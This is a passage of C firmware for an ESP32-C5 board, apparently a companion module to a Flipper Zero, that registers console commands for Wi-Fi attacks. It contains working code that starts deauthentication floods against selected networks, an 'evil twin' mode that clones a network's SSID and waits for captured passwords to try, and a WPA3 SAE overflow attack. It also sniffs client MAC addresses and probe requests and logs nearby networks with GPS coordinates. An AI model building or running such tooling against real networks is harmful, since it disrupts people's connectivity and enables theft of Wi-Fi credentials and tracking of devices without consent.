        return 1;
    }
    g_selected_count = 0;
    for (int i = 1; i < argc && g_selected_count < MAX_AP_CNT; ++i) {
        int idx = atoi(argv[i]);
        idx--;//because flipper app uses indexes from 1
        if (idx < 0 || idx >= (int)g_scan_count) {
            ESP_LOGW(TAG,"Index %d out of bounds (0..%u)", idx, g_scan_count ? (g_scan_count - 1) : 0);
            continue;
        }
        g_selected_indices[g_selected_count++] = idx;
    }
    if (g_selected_count == 0) {
        ESP_LOGW(TAG,"First, run scan_networks.");
        return 1;
    }

    char buf[500];
    int len = snprintf(buf, sizeof(buf), "Selected Networks:\n");

    for (int i = 0; i < g_selected_count; ++i) {
        const wifi_ap_record_t* ap = &g_scan_results[g_selected_indices[i]];
        
        // I assume auth is available as a string in your structure, if not - replace with appropriate field or string.
        const char* auth = authmode_to_string(ap->authmode);

        // Formatting: SSID, BSSID, Channel, Auth
        len += snprintf(buf + len, sizeof(buf) - len, "%s, %02x:%02x:%02x:%02x:%02x:%02x, Ch%d, %s%s\n",
                        (char*)ap->ssid,
                        ap->bssid[0], ap->bssid[1], ap->bssid[2],
                        ap->bssid[3], ap->bssid[4], ap->bssid[5],
                        ap->primary, auth,
                        (i + 1 == g_selected_count) ? "" : "");
    }

    vTaskDelay(pdMS_TO_TICKS(100));
    MY_LOG_INFO(TAG, "%s", buf);
    vTaskDelay(pdMS_TO_TICKS(100));

    return 0;
}


int onlyDeauth = 0;

// Deauth attack task function (runs in background)
static void deauth_attack_task(void *pvParameters) {
    (void)pvParameters;
    
    MY_LOG_INFO(TAG,"Deauth attack task started.");
    
    //Main loop of deauth frames sending:
    while (deauth_attack_active && 
           ((applicationState == DEAUTH) || (applicationState == DEAUTH_EVIL_TWIN) || (applicationState == EVIL_TWIN_PASS_CHECK))) {
        // Check for stop request (check at start of loop for faster response)
        if (operation_stop_requested || !deauth_attack_active) {
            MY_LOG_INFO(TAG, "Deauth attack: Stop requested, terminating...");
            operation_stop_requested = false;
            deauth_attack_active = false;
            applicationState = IDLE;
            
            // Clean up after attack (ignore LED errors)
            esp_err_t led_err = led_strip_clear(strip);
            if (led_err == ESP_OK) {
                led_strip_refresh(strip);
            }
            
            break;
        }
        
        // Check if it's time for channel monitoring (every 5 minutes)
        // Only perform periodic re-scan during active deauth attacks (DEAUTH and DEAUTH_EVIL_TWIN)
        if ((applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) && check_channel_changes()) {
            MY_LOG_INFO(TAG, "Performing periodic channel check...");
            
            // Set LED to yellow during re-scan
            esp_err_t led_err = led_strip_set_pixel(strip, 0, 255, 255, 0); // Yellow
            if (led_err == ESP_OK) {
                led_strip_refresh(strip);
            }
            
            // Temporarily pause deauth for scanning
            esp_err_t scan_result = quick_channel_scan();
            if (scan_result == ESP_OK) {
                MY_LOG_INFO(TAG, "Channel check completed, resuming deauth");
            } else {
                MY_LOG_INFO(TAG, "Channel check failed, continuing with current channels");
            }
            
            // Clear LED after re-scan (ignore errors if LED is in invalid state)
            led_err = led_strip_clear(strip);
            if (led_err == ESP_OK) {
                led_strip_refresh(strip);
            }
        }
        
        if (applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) {
            // Send deauth frames (silent mode - no UART spam)
            ESP_ERROR_CHECK(led_strip_set_pixel(strip, 0, 0, 0, 255));
            ESP_ERROR_CHECK(led_strip_refresh(strip));
            wsl_bypasser_send_deauth_frame_multiple_aps(g_scan_results, g_selected_count);
            ESP_ERROR_CHECK(led_strip_clear(strip));
            ESP_ERROR_CHECK(led_strip_refresh(strip));
        }
        
        // Delay and yield to allow UART console processing
        vTaskDelay(pdMS_TO_TICKS(100));
        taskYIELD(); // Give other tasks (including console) a chance to run
    }
    
    // Clean up LED after attack finishes naturally (ignore LED errors)
    esp_err_t led_err = led_strip_clear(strip);
    if (led_err == ESP_OK) {
        led_strip_refresh(strip);
    }
    
    deauth_attack_active = false;
    deauth_attack_task_handle = NULL;
    
    // DO NOT clear target BSSIDs when attack ends - keep them for potential restart
    // target_bssid_count = 0;
    // memset(target_bssids, 0, sizeof(target_bssids));
    
    MY_LOG_INFO(TAG,"Deauth attack task finished.");
    
    vTaskDelete(NULL); // Delete this task
}

static int cmd_start_deauth(int argc, char **argv) {
    onlyDeauth = 1;
    return cmd_start_evil_twin(argc, argv);
}

static int cmd_start_sae_overflow(int argc, char **argv) {
    //avoid compiler warnings:
    (void)argc; (void)argv;
    
    // Check if SAE attack is already running
    if (sae_attack_active || sae_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "SAE overflow attack already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;

    if (g_selected_count == 1) {
        applicationState = SAE_OVERFLOW;
        int idx = g_selected_indices[0];
        const wifi_ap_record_t *ap = &g_scan_results[idx];
        
        // Set LED
        esp_err_t led_err = led_strip_set_pixel(strip, 0, 255, 0, 0);
        if (led_err == ESP_OK) {
            led_strip_refresh(strip);
        }
        
        MY_LOG_INFO(TAG,"WPA3 SAE Overflow Attack");
        MY_LOG_INFO(TAG,"Target: SSID='%s' Ch=%d Auth=%d", (const char*)ap->ssid, ap->primary, ap->authmode);
        MY_LOG_INFO(TAG,"SAE attack started. Use 'stop' to stop.");
        
        // Allocate memory for ap_record to pass to task
        wifi_ap_record_t *ap_copy = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t));
        if (ap_copy == NULL) {
            MY_LOG_INFO(TAG, "Failed to allocate memory for SAE attack!");
            applicationState = IDLE;
            return 1;
        }
        memcpy(ap_copy, ap, sizeof(wifi_ap_record_t));
        
        // Start SAE attack in background task
        sae_attack_active = true;
        BaseType_t result = xTaskCreate(
            sae_attack_task,
            "sae_task",
            8192,  // Larger stack size for crypto operations
            ap_copy,
            5,     // Priority
            &sae_attack_task_handle
        );
        
        if (result != pdPASS) {
            MY_LOG_INFO(TAG, "Failed to create SAE overflow task!");
            free(ap_copy);
            sae_attack_active = false;
            applicationState = IDLE;
            return 1;
        }
        
    } else {
        MY_LOG_INFO(TAG,"SAE Overflow: you need to select exactly ONE network (use select_networks).");
    }
    return 0;
}

/*
0) Sends the first network name over ESP-NOW to ESP32
1) Starts a stream of deauth pockets sent to all target networks. 
2) Listens for password to try over ESP-NOW
3) When password arrives, stops deauth stream and attempts to connect to a network

*/
static int cmd_start_evil_twin(int argc, char **argv) {
    //avoid compiler warnings:
    (void)argc; (void)argv;
    
    // Check if attack is already running
    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Deauth attack already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;

    if (g_selected_count > 0) {
        // Set application state based on attack type
        if (onlyDeauth) {
            applicationState = DEAUTH;
        } else {
            applicationState = DEAUTH_EVIL_TWIN;
        }

        const char *sourceSSID = (const char *)g_scan_results[g_selected_indices[0]].ssid;
        evilTwinSSID = malloc(strlen(sourceSSID) + 1); 
        if (evilTwinSSID != NULL) {
            strcpy(evilTwinSSID, sourceSSID);
        } else {
            ESP_LOGW(TAG,"Malloc error 4 SSID");
        }

        //send evil ssid to ESP32 via ESP-NOW
        if (!onlyDeauth) {
            char msg[100];
            sprintf(msg, "#()^7841%%_%s", evilTwinSSID);
            esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
            vTaskDelay(pdMS_TO_TICKS(100));
            ESP_ERROR_CHECK(esp_now_send(esp32_mac, (uint8_t *)msg, strlen(msg)));
            MY_LOG_INFO(TAG,"Evil twin: %s", evilTwinSSID);
        }


        MY_LOG_INFO(TAG,"Attacking %d network(s):", g_selected_count);
        for (int i = 0; i < g_selected_count; ++i) {
            int idx = g_selected_indices[i];
            wifi_ap_record_t *ap = &g_scan_results[idx];
            MY_LOG_INFO(TAG,"  [%d] SSID='%s' Ch=%d RSSI=%d", idx, (const char*)ap->ssid, ap->primary, ap->rssi);
        }
        
        // Save target BSSIDs for channel monitoring
        save_target_bssids();
        last_channel_check_time = esp_timer_get_time() / 1000; // Convert to milliseconds
        
        MY_LOG_INFO(TAG,"Deauth attack started. Use 'stop' to stop.");
        
        // Start deauth attack in background task
        deauth_attack_active = true;
        BaseType_t result = xTaskCreate(
            deauth_attack_task,
            "deauth_task",
            4096,  // Stack size
            NULL,
            5,     // Priority
            &deauth_attack_task_handle
        );
        
        if (result != pdPASS) {
            MY_LOG_INFO(TAG, "Failed to create deauth attack task!");
            deauth_attack_active = false;
            applicationState = IDLE;
            return 1;
        }
        
    } else {
        MY_LOG_INFO(TAG,"Evil twin: no selected APs (use select_networks).");
    }
    return 0;
}

static int cmd_stop(int argc, char **argv) {
    (void)argc; (void)argv;
    MY_LOG_INFO(TAG, "Stop command received - stopping all operations...");
    
    // Set global stop flags
    operation_stop_requested = true;
    wardrive_active = false;
    
    // Stop deauth attack task if running
    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping deauth attack task...");
        deauth_attack_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && deauth_attack_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (deauth_attack_task_handle != NULL) {
            vTaskDelete(deauth_attack_task_handle);
            deauth_attack_task_handle = NULL;
            MY_LOG_INFO(TAG, "Deauth attack task forcefully stopped.");
        }
        
        // Clear target BSSIDs
        target_bssid_count = 0;
        memset(target_bssids, 0, sizeof(target_bssids));
    }
    
    // Stop SAE overflow attack task if running
    if (sae_attack_active || sae_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping SAE overflow task...");
        sae_attack_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && sae_attack_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (sae_attack_task_handle != NULL) {
            vTaskDelete(sae_attack_task_handle);
            sae_attack_task_handle = NULL;
            MY_LOG_INFO(TAG, "SAE overflow task forcefully stopped.");
        }
    }
    
    // Stop any active attacks
    if (applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN || 
        applicationState == EVIL_TWIN_PASS_CHECK || applicationState == SAE_OVERFLOW) {
        MY_LOG_INFO(TAG, "Stopping active attack (state: %d)...", applicationState);
        applicationState = IDLE;
        
        // Disable promiscuous mode if it was enabled for SAE_OVERFLOW
        esp_wifi_set_promiscuous(false);
    } else {
        applicationState = IDLE;
    }
    
    // Stop background scan if in progress
    if (g_scan_in_progress) {
        esp_wifi_scan_stop();
        g_scan_in_progress = false;
        MY_LOG_INFO(TAG, "Background scan stopped.");
    }
    
    // Stop sniffer if active (keep collected data)
    if (sniffer_active) {
        sniffer_active = false;
        sniffer_scan_phase = false;
        esp_wifi_set_promiscuous(false);
        
        // Stop channel hopping task
        if (sniffer_channel_task_handle != NULL) {
            vTaskDelete(sniffer_channel_task_handle);
            sniffer_channel_task_handle = NULL;
            MY_LOG_INFO(TAG, "Stopped sniffer channel hopping task");
        }
        
        // Reset channel state for next session
        sniffer_channel_index = 0;
        sniffer_current_channel = dual_band_channels[0];
        sniffer_last_channel_hop = 0;
        
        // Note: sniffer_aps and sniffer_ap_count are preserved for show_sniffer_results
        MY_LOG_INFO(TAG, "Sniffer stopped. Data preserved - use 'show_sniffer_results' to view.");
    }
    
    // Stop wardrive task if running
    if (wardrive_active || wardrive_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Stopping wardrive task...");
        wardrive_active = false;
        
        // Wait a bit for task to finish
        for (int i = 0; i < 20 && wardrive_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        
        // Force delete if still running
        if (wardrive_task_handle != NULL) {
            vTaskDelete(wardrive_task_handle);
            wardrive_task_handle = NULL;
            MY_LOG_INFO(TAG, "Wardrive task forcefully stopped.");
        }
    }
    
    // Clear LED (ignore errors if LED is in invalid state)
    esp_err_t led_err = led_strip_clear(strip);
    if (led_err == ESP_OK) {
        led_strip_refresh(strip);
    } else {
        ESP_LOGW(TAG, "Failed to clear LED (state: %s), ignoring...", esp_err_to_name(led_err));
    }
    
    MY_LOG_INFO(TAG, "All operations stopped.");
    return 0;
}

static int cmd_start_sniffer(int argc, char **argv) {
    (void)argc; (void)argv;
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;
    
    if (sniffer_active) {
        MY_LOG_INFO(TAG, "Sniffer already active. Use 'stop' to stop it first.");
        return 1;
    }
    
    MY_LOG_INFO(TAG, "Starting sniffer mode...");
    
    // Clear previous sniffer data when starting new session
    sniffer_ap_count = 0;
    memset(sniffer_aps, 0, sizeof(sniffer_aps));
    probe_request_count = 0;
    memset(probe_requests, 0, sizeof(probe_requests));
    MY_LOG_INFO(TAG, "Cleared previous sniffer data.");
    
    // Phase 1: Start network scan
    sniffer_active = true;
    sniffer_scan_phase = true;
    
    // Set LED (ignore errors if LED is in invalid state)
    esp_err_t led_err = led_strip_set_pixel(strip, 0, 255, 255, 0); // Yellow
    if (led_err == ESP_OK) {
        led_strip_refresh(strip);
    }
    
    esp_err_t err = start_background_scan();
    if (err != ESP_OK) {
        sniffer_active = false;
        sniffer_scan_phase = false;
        
        // Clear LED (ignore errors if LED is in invalid state)
        led_err = led_strip_clear(strip);
        if (led_err == ESP_OK) {
            led_strip_refresh(strip);
        }
        
        MY_LOG_INFO(TAG, "Failed to start scan for sniffer: %s", esp_err_to_name(err));
        return 1;
    }
    
    MY_LOG_INFO(TAG, "Sniffer started - scanning networks...");
    MY_LOG_INFO(TAG, "Use 'show_sniffer_results' to see captured clients or 'stop' to stop.");
    
    return 0;
}

static int cmd_show_sniffer_results(int argc, char **argv) {
    (void)argc; (void)argv;
    
    // Allow showing results even after sniffer is stopped
    if (sniffer_active && sniffer_scan_phase) {
        MY_LOG_INFO(TAG, "Sniffer is still scanning networks. Please wait...");
        return 0;
    }
    
    if (sniffer_ap_count == 0) {
        MY_LOG_INFO(TAG, "No sniffer data available. Use 'start_sniffer' to collect data.");
        return 0;
    }
    
    // Create a sorted array of AP indices by client count (descending)
    int sorted_indices[MAX_SNIFFER_APS];
    for (int i = 0; i < sniffer_ap_count; i++) {
        sorted_indices[i] = i;
    }
    
    // Simple bubble sort by client count (descending)
    for (int i = 0; i < sniffer_ap_count - 1; i++) {
        for (int j = 0; j < sniffer_ap_count - i - 1; j++) {
            if (sniffer_aps[sorted_indices[j]].client_count < sniffer_aps[sorted_indices[j + 1]].client_count) {
                int temp = sorted_indices[j];
                sorted_indices[j] = sorted_indices[j + 1];
                sorted_indices[j + 1] = temp;
            }
        }
    }
    
    // Compact format for Flipper Zero display
    int displayed_count = 0;
    for (int i = 0; i < sniffer_ap_count; i++) {
        int idx = sorted_indices[i];
        sniffer_ap_t *ap = &sniffer_aps[idx];
        
        // Skip broadcast BSSID and our own device
        if (is_broadcast_bssid(ap->bssid) || is_own_device_mac(ap->bssid)) {
            continue;
        }
        
        // Skip APs with no clients
        if (ap->client_count == 0) {
            continue;
        }
        
        displayed_count++;
        
        // Print AP info in compact format: SSID, CH: CLIENT_COUNT
        printf("%s, CH%d: %d\n", ap->ssid, ap->channel, ap->client_count);
        
        // Print each client MAC on a separate line with 1 space indentation
        if (ap->client_count > 0) {
            for (int j = 0; j < ap->client_count; j++) {
                sniffer_client_t *client = &ap->clients[j];
                printf(" %02X:%02X:%02X:%02X:%02X:%02X\n",
                       client->mac[0], client->mac[1], client->mac[2],
                       client->mac[3], client->mac[4], client->mac[5]);
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(20)); // Small delay to avoid overwhelming UART
    }
    
    if (displayed_count == 0) {
        MY_LOG_INFO(TAG, "No APs with clients found.");
    }
    
    return 0;
}

static int cmd_show_probes(int argc, char **argv) {
    (void)argc; (void)argv;
    
    if (probe_request_count == 0) {
        MY_LOG_INFO(TAG, "No probe requests captured. Use 'start_sniffer' to collect data.");
        return 0;
    }
    
    MY_LOG_INFO(TAG, "Probe requests: %d", probe_request_count);
    
    // Display each probe request: SSID (MAC)
    for (int i = 0; i < probe_request_count; i++) {
        probe_request_t *probe = &probe_requests[i];
        printf("%s (%02X:%02X:%02X:%02X:%02X:%02X)\n",
               probe->ssid,
               probe->mac[0], probe->mac[1], probe->mac[2],
               probe->mac[3], probe->mac[4], probe->mac[5]);
        
        vTaskDelay(pdMS_TO_TICKS(10)); // Small delay to avoid overwhelming UART
    }
    
    return 0;
}

static int cmd_sniffer_debug(int argc, char **argv) {
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Current sniffer debug mode: %s", sniff_debug ? "ON" : "OFF");
        MY_LOG_INFO(TAG, "Usage: sniffer_debug <0|1>");
        MY_LOG_INFO(TAG, "  0 = disable debug logging");
        MY_LOG_INFO(TAG, "  1 = enable debug logging");
        return 0;
    }
    
    int new_debug = atoi(argv[1]);
    if (new_debug != 0 && new_debug != 1) {
        MY_LOG_INFO(TAG, "Invalid value. Use 0 (disable) or 1 (enable)");
        return 1;
    }
    
    sniff_debug = new_debug;
    MY_LOG_INFO(TAG, "Sniffer debug mode %s", sniff_debug ? "ENABLED" : "DISABLED");
    
    if (sniff_debug) {
        MY_LOG_INFO(TAG, "Debug logging will show detailed packet analysis:");
        MY_LOG_INFO(TAG, "- Packet type, length, channel, RSSI");
        MY_LOG_INFO(TAG, "- All MAC addresses in packet");
        MY_LOG_INFO(TAG, "- AP matching process");
        MY_LOG_INFO(TAG, "- Reason for packet acceptance/rejection");
    }
    
    return 0;
}

static int cmd_reboot(int argc, char **argv)
{
    (void)argc; (void)argv;
    MY_LOG_INFO(TAG,"Restart...");
    vTaskDelay(pdMS_TO_TICKS(100));
    esp_restart();
    return 0;
}

// Wardrive task function (runs in background)
static void wardrive_task(void *pvParameters) {
    (void)pvParameters;
    
    MY_LOG_INFO(TAG, "Wardrive task started.");
    
    // Set LED to indicate wardrive mode
    esp_err_t led_err = led_strip_set_pixel(strip, 0, 0, 255, 255); // Cyan
    if (led_err == ESP_OK) {
        led_strip_refresh(strip);
    }
    
    // Find the next file number by scanning existing files
    wardrive_file_counter = find_next_wardrive_file_number();
    MY_LOG_INFO(TAG, "Next wardrive file will be: w%d.log", wardrive_file_counter);
    
    // Wait for GPS fix before starting
    MY_LOG_INFO(TAG, "Waiting for GPS fix...");
    if (!wait_for_gps_fix(120)) {  // Wait up to 120 seconds for GPS fix
        MY_LOG_INFO(TAG, "Warning: No GPS fix obtained, continuing without GPS data");
    } else {
        MY_LOG_INFO(TAG, "GPS fix obtained: Lat=%.7f Lon=%.7f", 
                   current_gps.latitude, current_gps.longitude);
    }
    
    MY_LOG_INFO(TAG, "Wardrive started. Use 'stop' command to stop.");
    
    // Main wardrive loop (runs until user stops)
    int scan_counter = 0;
    while (wardrive_active && !operation_stop_requested) {
        // Check for stop request at the beginning of loop
        if (operation_stop_requested || !wardrive_active) {
            MY_LOG_INFO(TAG, "Wardrive: Stop requested, terminating...");
            operation_stop_requested = false;
            wardrive_active = false;
            break;
        }
        // Read GPS data
        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(100));
        if (len > 0) {
            wardrive_gps_buffer[len] = '\0';
            char* line = strtok(wardrive_gps_buffer, "\r\n");
            while (line != NULL) {
                if (parse_gps_nmea(line)) {
                    MY_LOG_INFO(TAG, "GPS: Lat=%.7f Lon=%.7f Alt=%.1fm Acc=%.1fm", 
                               current_gps.latitude, current_gps.longitude, 
                               current_gps.altitude, current_gps.accuracy);
                }
                line = strtok(NULL, "\r\n");
            }
        }
        
        // Scan WiFi networks
        wifi_scan_config_t scan_cfg = {
            .ssid = NULL,
            .bssid = NULL,
            .channel = 0,
            .show_hidden = true,
            .scan_type = WIFI_SCAN_TYPE_ACTIVE,
            .scan_time.active.min = 100,
            .scan_time.active.max = 300,
        };
        
        // Start non-blocking scan
        esp_wifi_scan_start(&scan_cfg, false);
        
        // Wait for scan to complete with stop check
        bool scan_done = false;
        int timeout_ms = 10000; // 10 second timeout
        int elapsed_ms = 0;
        
        while (!scan_done && elapsed_ms < timeout_ms && !operation_stop_requested) {
            vTaskDelay(pdMS_TO_TICKS(100));
            elapsed_ms += 100;
            
            // Check if scan is done by trying to get results
            uint16_t temp_count = 0;
            esp_err_t result = esp_wifi_scan_get_ap_num(&temp_count);
            if (result == ESP_OK) {
                scan_done = true;
            }
        }
        
        if (!scan_done || operation_stop_requested) {
            esp_wifi_scan_stop();
            if (operation_stop_requested) {
                break; // Exit wardrive loop
            }
            continue; // Skip this scan iteration
        }
        
        uint16_t scan_count = MAX_AP_CNT;
        esp_wifi_scan_get_ap_records(&scan_count, wardrive_scan_results);
        
        // Create filename (keep it simple for FAT filesystem)
        char filename[32];
        snprintf(filename, sizeof(filename), "/sdcard/w%d.log", wardrive_file_counter);
        
        // Check if /sdcard directory is accessible
        struct stat st;
        if (stat("/sdcard", &st) != 0) {
            MY_LOG_INFO(TAG, "Error: /sdcard directory not accessible");
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }
        
        // Open file for appending
        FILE *file = fopen(filename, "a");
        if (file == NULL) {
            MY_LOG_INFO(TAG, "Failed to open file %s, errno: %d (%s)", filename, errno, strerror(errno));
            
            // Try creating file with different approach
            file = fopen(filename, "w");
            if (file == NULL) {
                MY_LOG_INFO(TAG, "Failed to create file %s, errno: %d (%s)", filename, errno, strerror(errno));
                vTaskDelay(pdMS_TO_TICKS(1000));
                continue;
            }
            MY_LOG_INFO(TAG, "Successfully created file %s", filename);
        }
        
        // Write header if file is new
        fseek(file, 0, SEEK_END);
        if (ftell(file) == 0) {
            fprintf(file, "WigleWifi-1.4,appRelease=v1.1,model=Gen4,release=v1.0,device=Gen4Board,display=SPI TFT,board=ESP32C5,brand=Laboratorium\n");
            fprintf(file, "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n");
        }
        
        // Get timestamp
        char timestamp[32];
        get_timestamp_string(timestamp, sizeof(timestamp));
        
        // Process scan results
        for (int i = 0; i < scan_count; i++) {
            wifi_ap_record_t *ap = &wardrive_scan_results[i];
            
            // Format MAC address
            char mac_str[18];
            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                    ap->bssid[0], ap->bssid[1], ap->bssid[2],
                    ap->bssid[3], ap->bssid[4], ap->bssid[5]);
            
            // Escape SSID for CSV
            char escaped_ssid[64];
            escape_csv_field((const char*)ap->ssid, escaped_ssid, sizeof(escaped_ssid));
            
            // Get auth mode string
            const char* auth_mode = get_auth_mode_wiggle(ap->authmode);
            
            // Format line for Wiggle format
            char line[512];
            if (current_gps.valid) {
                snprintf(line, sizeof(line), 
                        "%s,%s,[%s],%s,%d,%d,%.7f,%.7f,%.2f,%.2f,WIFI\n",
                        mac_str, escaped_ssid, auth_mode, timestamp,
                        ap->primary, ap->rssi,
                        current_gps.latitude, current_gps.longitude,
                        current_gps.altitude, current_gps.accuracy);
            } else {
                snprintf(line, sizeof(line), 
                        "%s,%s,[%s],%s,%d,%d,0.0000000,0.0000000,0.00,0.00,WIFI\n",
                        mac_str, escaped_ssid, auth_mode, timestamp,
                        ap->primary, ap->rssi);
            }
            
            // Write to file and print to UART
            fprintf(file, "%s", line);
            printf("%s", line);
        }
        
        // Close file to ensure data is written
        fclose(file);
        
        if (scan_count > 0) {
            MY_LOG_INFO(TAG, "Logged %d networks to %s", scan_count, filename);
        }
        
        scan_counter++;
        
        // Check for stop command
        if (operation_stop_requested || !wardrive_active) {
            MY_LOG_INFO(TAG, "Wardrive: Stop requested, terminating...");
            wardrive_active = false;
            operation_stop_requested = false;
            break;
        }
        
        // Yield to allow console processing
        taskYIELD();
        
        vTaskDelay(pdMS_TO_TICKS(5000)); // Wait 5 seconds between scans
    }
    
    // Clear LED after wardrive finishes
    led_err = led_strip_clear(strip);
    if (led_err == ESP_OK) {
        led_strip_refresh(strip);
    }
    
    wardrive_active = false;
    wardrive_task_handle = NULL;
    MY_LOG_INFO(TAG, "Wardrive stopped after %d scans. Last file: w%d.log", scan_counter, wardrive_file_counter);
    
    vTaskDelete(NULL); // Delete this task
}

static int cmd_start_wardrive(int argc, char **argv) {
    (void)argc; (void)argv;
    
    // Check if wardrive is already running
    if (wardrive_active || wardrive_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Wardrive already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;
    
    MY_LOG_INFO(TAG, "Starting wardrive mode...");
    
    // Initialize GPS UART
    esp_err_t ret = init_gps_uart();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize GPS UART: %s", esp_err_to_name(ret));
        return 1;
    }
    MY_LOG_INFO(TAG, "GPS UART initialized on pins %d (TX) and %d (RX)", GPS_TX_PIN, GPS_RX_PIN);
    
    // Initialize SD card
    ret = init_sd_card();
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }
    MY_LOG_INFO(TAG, "SD card initialized on pins MISO:%d MOSI:%d CLK:%d CS:%d", 
                SD_MISO_PIN, SD_MOSI_PIN, SD_CLK_PIN, SD_CS_PIN);
    
    // Start wardrive in background task
    wardrive_active = true;
    BaseType_t result = xTaskCreate(
        wardrive_task,
        "wardrive_task",
        8192,  // Stack size - needs to be large for file operations
        NULL,
        5,     // Priority
        &wardrive_task_handle
    );
    
    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create wardrive task!");
        wardrive_active = false;
        return 1;
    }
    
    MY_LOG_INFO(TAG, "Wardrive task started. Use 'stop' to stop.");
    return 0;
}

// --- Command registration in esp_console ---
static void register_commands(void)
{
    const esp_console_cmd_t scan_cmd = {
        .command = "scan_networks",
        .help = "Starts background network scan",
        .hint = NULL,
        .func = &cmd_scan_networks,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&scan_cmd));

    const esp_console_cmd_t show_scan_cmd = {
        .command = "show_scan_results",
        .help = "Shows results from last network scan",
        .hint = NULL,
        .func = &cmd_show_scan_results,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&show_scan_cmd));
    

    const esp_console_cmd_t sniffer_cmd = {
        .command = "start_sniffer",
        .help = "Starts network client sniffer",
        .hint = NULL,
        .func = &cmd_start_sniffer,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&sniffer_cmd));


    const esp_console_cmd_t show_sniffer_cmd = {
        .command = "show_sniffer_results",
        .help = "Shows sniffer results sorted by client count",
        .hint = NULL,
        .func = &cmd_show_sniffer_results,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&show_sniffer_cmd));

    const esp_console_cmd_t show_probes_cmd = {
        .command = "show_probes",
        .help = "Shows captured probe requests with SSIDs",
        .hint = NULL,
        .func = &cmd_show_probes,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&show_probes_cmd));

    const esp_console_cmd_t sniffer_debug_cmd = {
        .command = "sniffer_debug",
        .help = "Enable/disable detailed sniffer debug logging: sniffer_debug <0|1>",
        .hint = NULL,
        .func = &cmd_sniffer_debug,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&sniffer_debug_cmd));

    const esp_console_cmd_t select_cmd = {
        .command = "select_networks",
        .help = "Selects networks by indexes: select_networks 0 2 5",
        .hint = NULL,
        .func = &cmd_select_networks,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&select_cmd));

    const esp_console_cmd_t start_cmd = {
        .command = "start_evil_twin",
        .help = "Starts Evil Twin attack.",
        .hint = NULL,
        .func = &cmd_start_evil_twin,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&start_cmd));

    const esp_console_cmd_t deauth_cmd = {
        .command = "start_deauth",
        .help = "Starts Deauth attack.",
        .hint = NULL,
        .func = &cmd_start_deauth,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&deauth_cmd));

       const esp_console_cmd_t sae_overflow_cmd = {
        .command = "sae_overflow",
        .help = "Starts SAE WPA3 Client Overflow attack.",
        .hint = NULL,
        .func = &cmd_start_sae_overflow,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&sae_overflow_cmd));

    const esp_console_cmd_t wardrive_cmd = {
        .command = "start_wardrive",
        .help = "Starts wardriving with GPS and SD logging",
        .hint = NULL,
        .func = &cmd_start_wardrive,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&wardrive_cmd));

    const esp_console_cmd_t stop_cmd = {
        .command = "stop",
        .help = "Stop all running operations",
        .hint = NULL,
        .func = &cmd_stop,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&stop_cmd));

    const esp_console_cmd_t reboot_cmd = {
        .command = "reboot",
        .help = "Device reboot to start from scratch",
        .hint = NULL,
        .func = &cmd_reboot,
        .argtable = NULL
    };
    ESP_ERROR_CHECK(esp_console_cmd_register(&reboot_cmd));
}

void app_main(void) {

    // esp_log_level_set("wifi", ESP_LOG_INFO);
    // esp_log_level_set("projectZero", ESP_LOG_INFO);
    // esp_log_level_set("espnow", ESP_LOG_INFO);

    // esp_log_level_set("wifi", ESP_LOG_DEBUG);
    // esp_log_level_set(TAG, ESP_LOG_DEBUG);
    // esp_log_level_set("espnow", ESP_LOG_DEBUG);


    //MY_LOG_INFO(TAG, "Application starts (ESP32-C5)");

    // 1. LED strip configuration
